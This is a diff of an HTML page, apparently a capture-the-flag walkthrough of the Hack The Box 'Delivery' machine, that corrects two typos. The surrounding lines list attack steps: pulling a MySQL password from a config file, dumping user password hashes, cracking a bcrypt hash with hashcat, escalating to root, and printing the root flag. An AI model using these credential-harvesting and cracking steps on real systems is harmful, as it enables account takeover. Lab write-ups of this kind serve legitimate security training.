@@ -534,7 +534,7 @@ Until next time, happy hacking!</p>
 <h3 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <ol>
 <li>Add <code>10.10.10.222 delivery.htb</code> to your hosts file.</li>
-<li>Suft to <code>http://delivery.htb</code> and click on <code>Contact Us</code>.</li>
+<li>Surf to <code>http://delivery.htb</code> and click on <code>Contact Us</code>.</li>
 <li>Follow on screen instructions to create an account on the MatterMost service.</li>
 <li>Once in the MatterMost server, take note of the messages <code>root</code> left in the Internal channel.</li>
 </ol>
@@ -548,7 +548,7 @@ Until next time, happy hacking!</p>
 <li>Get MySQL password from the MatterMost config: <code>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep -B5 -A5 -i mysql</code></li>
 <li>Log into MySQL: <code> mysql -u mmuser --password=&quot;Crack_The_MM_Admin_PW&quot;</code></li>
 <li>Connect to MatterMost DB: <code>use mattermost</code></li>
-<li>Dump user databse and find root user hash: <code>select * from Users;</code> &ndash;&gt; <code>2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</code></li>
+<li>Dump user database and find root user hash: <code>select * from Users;</code> &ndash;&gt; <code>2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</code></li>
 <li>Crack it with <code>hashcat -a 3 -m 3200 &lt;hash.txt&gt; PleaseSubscribe!?a?a</code> &ndash;&gt; <code>PleaseSubscribe!21</code></li>
 <li>Use cracked password to <code>su</code> as <code>root</code></li>
 <li><code>cat /root/root.txt</code> &ndash;&gt; <code>c6b16aa7f637fc4e61444854fac70874</code></li>
